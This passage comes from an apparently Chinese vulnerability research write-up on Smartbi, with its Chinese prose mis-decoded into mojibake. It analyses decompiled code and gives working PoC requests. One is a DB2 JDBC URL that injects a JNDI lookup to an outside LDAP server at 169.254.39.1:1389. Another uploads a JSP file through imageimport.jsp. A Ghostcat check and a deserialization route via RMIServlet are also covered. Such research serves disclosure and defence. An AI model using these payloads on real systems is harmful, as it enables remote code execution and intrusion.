function_">getConnection</span><span class="hljs-params">(String driver, String url, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>    info.setId(UUIDGenerator.generate());<br>    info.setName(connName);<br>    <span class="hljs-comment">// driver å’Œ url å‚æ•°éƒ½æ˜¯ä» drvInfoå–å€¼</span><br>    info.setDriver(driver);<br>    info.setUrl(url);<br>    info.setUser(dbUser);<br>    info.setPassword(dbPass);<br>    <span class="hljs-comment">//è°ƒç”¨ getConnection æ–¹æ³•ã€‚æ‰§è¡Œ jdbc </span><br>    <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        driverType = DBType.valueOf(dbType.toUpperCase());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>    <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>        info.setId(UUIDGenerator.generate());<br>        info.setName(connName);<br>        info.setDriverType(driverType);<br>        info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>        info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>        info.setUser(dbUser);<br>        info.setPassword(dbPass);<br>        <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› translateDriverInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName) &#123;<br>    <span class="hljs-keyword">return</span> translateDriverInfo(dbType, serverName, dbName, (String)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>    String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//ä»¥ dbType ç¡®å®šæ•°æ®åº“ç±»å‹</span><br>    <span class="hljs-keyword">switch</span> (dbType) &#123;<br>        <span class="hljs-keyword">case</span> DB2:<br>        <span class="hljs-keyword">case</span> DB2_400:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>            result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DB2_V9:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>            <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>æ„é€ poc:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>localhost:<span class="hljs-number">6688</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br><br><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>:<span class="hljs-number">18080</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png" alt="20250802165747255"></p><h2 id="tomcat-å†å²æ¼æ´ï¼ˆå®åˆ™æ²¡æœ‰ï¼‰"><a href="#tomcat-å†å²æ¼æ´ï¼ˆå®åˆ™æ²¡æœ‰ï¼‰" class="headerlink" title="tomcat å†å²æ¼æ´ï¼ˆå®åˆ™æ²¡æœ‰ï¼‰"></a>tomcat å†å²æ¼æ´ï¼ˆå®åˆ™æ²¡æœ‰ï¼‰</h2><p>ç¡®å®š tomcat ç‰ˆæœ¬ä¸º <code>Apache Tomcat Version 7.0.34</code></p><p>E:\Smartbi\Tomcat\RELEASE-NOTES</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png" alt="20250731181914395"></p><h2 id="1ã€AJP-å¯¼è‡´çš„-RCE"><a href="#1ã€AJP-å¯¼è‡´çš„-RCE" class="headerlink" title="1ã€AJP å¯¼è‡´çš„ RCE"></a>1ã€AJP å¯¼è‡´çš„ RCE</h2><blockquote><p>CVE-2020-1938 ï¼šApache Tomcat AJP æ¼æ´å¤ç°å’Œåˆ†æ</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>é»˜è®¤æƒ…å†µä¸‹,Apache Tomcatä¼šå¼€å¯AJPè¿æ¥å™¨,æ–¹ä¾¿ä¸å…¶ä»–WebæœåŠ¡å™¨é€šè¿‡AJPåè®®è¿›è¡Œäº¤äº’.ä½†Apache Tomcatåœ¨AJPåè®®çš„å®ç°ä¸Šå­˜åœ¨æ¼æ´,å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€æ¶æ„çš„AJPè¯·æ±‚,å¯ä»¥è¯»å–æˆ–è€…åŒ…å«Webåº”ç”¨æ ¹ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶,å¦‚æœé…åˆæ–‡ä»¶ä¸Šä¼ ä»»æ„æ ¼å¼æ–‡ä»¶ï¼Œå°†å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ(RCE).è¯¥æ¼æ´åˆ©ç”¨AJPæœåŠ¡ç«¯å£å®ç°æ”»å‡»,æœªå¼€å¯AJPæœåŠ¡å¯¹å¤–ä¸å—æ¼æ´å½±å“ï¼ˆtomcaté»˜è®¤å°†AJPæœåŠ¡å¼€å¯å¹¶ç»‘å®šè‡³0.0.0.0&#x2F;0ï¼‰.</p></blockquote><p>ç¡®è®¤ 18009 ç«¯å£å¼€æ”¾ï¼Œä¸”èƒ½å¤Ÿå»ºç«‹ TCP è¿æ¥ï¼š</p><p><code>Test-NetConnection -ComputerName 127.0.0.1 -Port 18009</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png" alt="20250731185501657"></p><p>ä½¿ç”¨ Ghostcat æ¼æ´æ£€æµ‹å·¥å…·ï¼š</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>è„šæœ¬æˆåŠŸå»ºç«‹äº†AJPåè®®è¿æ¥è¿”å›äº†Tomcat 7.0.34çš„é”™è¯¯é¡µé¢</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png" alt="20250731191051181"></p><p>å¯èƒ½ç”±äºSmartbiå¯¹WEB-INFç›®å½•åšäº†é¢å¤–ä¿æŠ¤æˆ–è€…Tomcaté…ç½®äº†é™åˆ¶è®¿é—®ï¼Œå¹¶ä¸èƒ½è¯»å–åˆ°æ–‡ä»¶</p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>æ–‡ä»¶ä½ç½®ï¼šTomcat&#x2F;webapps&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>    <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>       dir.mkdirs();<br>    &#125;<br>    <span class="hljs-comment">//ä»è¯·æ±‚å¤´ X-File-Name è·å–ä¸Šä¼ æ–‡ä»¶å</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-comment">//è·å–æ–‡ä»¶ç±»å‹</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileType</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦åŒ…å« image å­—ç¬¦ä¸² </span><br>    <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>       response.resetBuffer();<br>       response.getOutputStream().write(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>       <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + fileName);<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    <span class="hljs-type">int</span> bytesRead;<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>    <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>       fos.write(buf, <span class="hljs-number">0</span>, bytesRead);<br>    &#125;<br>    fos.flush();<br>    fos.close();<br>    smartbi.net.sf.json.<span class="hljs-type">JSONObject</span> <span class="hljs-variable">jobj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">smartbi</span>.net.sf.json.JSONObject();<br>    jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> jobj.toString();<br>    response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>    response.resetBuffer();<br>    response.getOutputStream().write(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>å¯¹ä¸Šä¼ çš„æ–‡ä»¶åã€MIMEç±»å‹æ— åˆ¤æ–­ã€ä¸ä¸¥è°¨ï¼Œå¯ä¼ªé€ ä¼ªé€ æ–‡ä»¶ç±»å‹ä¸Šä¼ æˆåŠŸï¼Œé€ æˆæ¼æ´</p><p><strong>æ¼æ´å¤ç°ï¼š</strong></p><p>è·¯ç”±ï¼š<a href="http://localhost:18080/smartbi/vision/designer/imageimport.jsp">http://localhost:18080/smartbi/vision/designer/imageimport.jsp</a></p><p>éœ€è¦é…ç½®é¡µï¼ˆ<a href="http://localhost:18080/smartbi/vision/config.jsp%EF%BC%89%E7%9A%84%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%BB%93%E5%90%88%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E">http://localhost:18080/smartbi/vision/config.jspï¼‰çš„ç™»å½•å¯†ç ï¼Œæ‰€ä»¥ä¸èƒ½å’Œæœªæˆæƒè®¿é—®ç»“åˆï¼Œå±äºåå°æ¼æ´</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png" alt="20250805160347015"></p><p>poc:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//GET å’Œ POST éƒ½å¯ä»¥</span><br>GET <span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>ageimport.jsp HTTP/<span class="hljs-number">1.1</span><br><br>X-<span class="hljs-keyword">File</span>-Type: image<br>X-<span class="hljs-keyword">File</span>-Name: <span class="hljs-number">1</span>.jsp<br><br>&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/designer/imageimport.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF<br><span class="hljs-attribute">X-File-Type</span><span class="hljs-punctuation">: </span>image<br><span class="hljs-attribute">X-File-Name</span><span class="hljs-punctuation">: </span>1.jsp<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-mel">&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png" alt="20250805161922205"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png" alt="20250805162159129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png" alt="20250805162430488"></p><h2 id="JDBCååºåˆ—åŒ–"><a href="#JDBCååºåˆ—åŒ–" class="headerlink" title="JDBCååºåˆ—åŒ–"></a>JDBCååºåˆ—åŒ–</h2><blockquote><p>JDBCååºåˆ—åŒ–å­¦ä¹ </p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p></blockquote><h3 id="å…³é”®æ¡ä»¶ï¼š"><a href="#å…³é”®æ¡ä»¶ï¼š" class="headerlink" title="å…³é”®æ¡ä»¶ï¼š"></a>å…³é”®æ¡ä»¶ï¼š</h3><ol><li><p>mysql-connector-java çš„ä¾èµ–ç‰ˆæœ¬ä¸º5.1.44ï¼Œæ”¯æŒ <code>autoDeserialize=true</code> å‚æ•°ï¼Œå…·å¤‡ååºåˆ—åŒ–è§¦å‘ç‚¹</p></li><li><p>åœ¨ pom.xml ä¸­ common-collections ç‰ˆæœ¬ä¸º 3.2.1ï¼Œå­˜åœ¨ccååºåˆ—åŒ–åˆ©ç”¨é“¾</p></li><li><p>å­˜åœ¨æ–¹æ³•è°ƒç”¨åå°„æœºåˆ¶ RMIServlet ï¼Œå¯è¿œç¨‹è°ƒç”¨ä»»æ„ç±»æ–¹æ³•</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png" alt="20250806085001007"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png" alt="20250806125442264"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png" alt="20250806125519870"></p><h3 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p>è§¦å‘ç‚¹ï¼šDataSourceService -&gt; testConnection</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»è€…å‘<code>/vision/RMIServlet</code> å‘é€å¦‚ä¸‹ POST è¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:18080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-nim">className=<span class="hljs-type">DataSourceService</span>&amp;methodName=testConnection&amp;params=[<span class="hljs-meta">&#123;...&#125;</span>]</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ç±»åå’Œæ–¹æ³•ååå°„è°ƒç”¨ï¼Œå³ï¼š</p><p><code>className = DataSourceService</code> </p><p><code>methodName = testConnection</code> </p><p><code>params = [...]</code> æ˜¯ JSON æ•°ç»„å­—ç¬¦ä¸²ï¼Œä¼ è¿›å»åè¢«åŒ…è£…æˆ <code>JSONArray</code> ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-comment">//RMIModule.getInstance() è¿”å›ä¸€ä¸ªè¿œç¨‹æœåŠ¡æ¨¡å—ï¼ˆå•ä¾‹ï¼‰ï¼Œå®ƒè´Ÿè´£ç®¡ç†æ‰€æœ‰å¯è¿œç¨‹è°ƒç”¨çš„æœåŠ¡ï¼ŒgetService(className) æ ¹æ®ç±»åè·å–å¯¹åº”çš„ ClientService å®ä¾‹ã€‚</span><br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//ç»“æœå­—ç¬¦ä¸²çš„æ„å»ºå™¨ buff ç”¨äºç”Ÿæˆæœ€ç»ˆ JSON æ ¼å¼çš„å“åº”ä½“</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-comment">//åˆ¤æ–­ service æ˜¯å¦å­˜åœ¨ï¼Œæœªæ‰¾åˆ°å°±æŠ›å‡ºå¼‚å¸¸</span><br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//è®°å½•è°ƒç”¨æ—¶é—´</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-comment">//æ‰§è¡Œ execute æ–¹æ³•ï¼Œå³åå°„è°ƒç”¨</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125;              